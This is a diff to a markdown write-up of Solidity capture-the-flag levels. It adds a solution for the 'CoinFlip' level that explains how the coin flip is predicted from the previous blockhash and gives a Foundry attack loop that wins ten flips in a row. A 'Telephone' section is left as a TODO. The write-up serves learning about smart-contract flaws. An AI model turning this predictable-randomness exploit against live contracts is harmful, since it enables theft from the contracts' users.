@@ -202,3 +202,73 @@ challenge.Fal1out();
 ### References
 
 * https://docs.soliditylang.org/en/v0.8.18/contracts.html#constructors
+
+## 03 CoinFlip
+
+To beat this level, we need to comply with
+
+```solidity
+return instance.consecutiveWins() >= 10;
+```
+
+That is, we need to win the game 10 or more times.
+
+### Solution
+
+First of all, there is a control that prevents you to do all the coin guesses in the same block
+
+```solidity
+if (lastHash == blockValue) {
+  revert();
+}
+
+lastHash = blockValue;
+```
+
+Now, the game works by taking the blockhash, divide it by a `FACTOR` (which is `2**255`) and compare it with one. As the blockhash space is [0, `2**256 - 1`], there is a 50% chance of getting a `0` or a `1`.
+
+```solidity
+uint256 coinFlip = blockValue / FACTOR;
+bool side = coinFlip == 1 ? true : false;
+```
+
+All we have to do, then, is performing the calculation ourselves to _guess_ the right value.
+
+Notice that we need to move to the next block on each iteration. To that end, [we leverage the forge cheatcode](https://book.getfoundry.sh/cheatcodes/roll) `vm.roll()`.
+
+```solidity
+function attack(Vm vm) public {
+  // we need to be right 10 times in order to beat the level.
+  for (uint i = 0; i < 10; i++) {
+    // compute our "guess" in advance.
+    blockValue = uint256(blockhash(block.number - 1));
+    coinFlip = blockValue / FACTOR;
+    side = coinFlip == 1 ? true : false;
+
+    // we flip and give our "guess".
+    coinFlipContract.flip(side);
+
+    // let's move to the next block.
+    vm.roll(block.number + 1);
+  }
+}
+```
+
+#### References
+
+* https://book.getfoundry.sh/forge/cheatcodes
+* https://book.getfoundry.sh/cheatcodes/
+
+## 04 Telephone
+
+To beat this level, we need to comply with
+
+...
+
+### Solution
+
+* TODO
+
+### References
+
+* TODO
